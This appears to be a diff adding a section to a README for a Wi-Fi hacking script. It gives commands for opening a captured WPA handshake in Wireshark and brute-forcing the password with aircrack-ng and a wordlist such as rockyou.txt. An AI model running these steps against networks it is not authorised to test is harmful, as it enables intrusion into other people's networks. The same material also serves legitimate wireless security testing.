@@ -36,6 +36,19 @@ chmod +x wifi-hack.sh
 ./handshakeCatcher.sh
 ```
 
+## Crack the password
 
+Use Wireshark to open the captured file. Make sure you capture the 4-way handshake.
+
+```bash
+wireshark <filename>.cap
+```
+Filter wireshark messages for eapol
+
+#### Use Aircrack-ng to crack the password. Provide a password list, such as rockyou.txt, for brute force.
+
+```bash
+aircrack-ng <filename>.cap -w <passwordlist>.txt
+```
 
 Feel free to customize the content further based on your preferences or additional information you want to include in the README.
